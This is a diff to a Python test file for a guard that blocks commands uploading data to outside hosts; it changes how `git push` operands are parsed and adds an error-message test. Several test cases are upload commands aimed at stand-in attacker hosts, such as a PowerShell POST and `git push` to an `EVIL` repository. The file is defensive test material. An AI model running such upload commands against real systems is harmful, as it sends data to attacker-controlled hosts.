@@ -104,12 +104,14 @@ CASES = [
     (f"iwr -Uri:https://{EVIL} -Method POST", BLOCK),
     ("iwr -Uri https://api.github.com -Method POST -Body x", OK),
     ("iwr https://internal.host/api -TimeoutSec 30 -Body", BLOCK),
-    # git push: only the repository operand is a host; a refspec and an option value are not
-    ("git push HEAD:main", OK),
-    ("git push feature:main", OK),
-    ("git push +feature:main", OK),
-    ("git push :main", OK),
+    # git push: the first operand is the repository (a host); later operands are refspecs; option values are neither
+    ("git push HEAD:main", BLOCK),
+    ("git push feature:main", BLOCK),
+    ("git push +feature:main", BLOCK),
+    ("git push --repo origin HEAD:main", OK),
     ("git push origin HEAD:main", OK),
+    ("git push origin feature:main", OK),
+    ("git push -u origin +feature:main", OK),
     ("git push --push-option=https://evil.example.com/x origin main", OK),
     ("git push -o https://evil.example.com/x origin main", OK),
     (f"git push {EVIL}:x/y.git main", BLOCK),
@@ -140,3 +142,13 @@ def test_a_block_beats_an_ask_in_the_same_line(capsys: pytest.CaptureFixture[str
         patch.setenv("CHOCK_RAW_COMMAND", command)
         assert guard.run(command.split()) == BLOCK
     assert "uploading data to" in capsys.readouterr().err
+
+
+def test_a_lone_refspec_push_names_the_remote_first(capsys: pytest.CaptureFixture[str]) -> None:
+    command = "git push HEAD:main"
+    with pytest.MonkeyPatch.context() as patch:
+        patch.setenv("CHOCK_RAW_COMMAND", command)
+        assert guard.run(command.split()) == BLOCK
+    err = capsys.readouterr().err
+    assert "as the repository" in err
+    assert "git push origin HEAD:main" in err
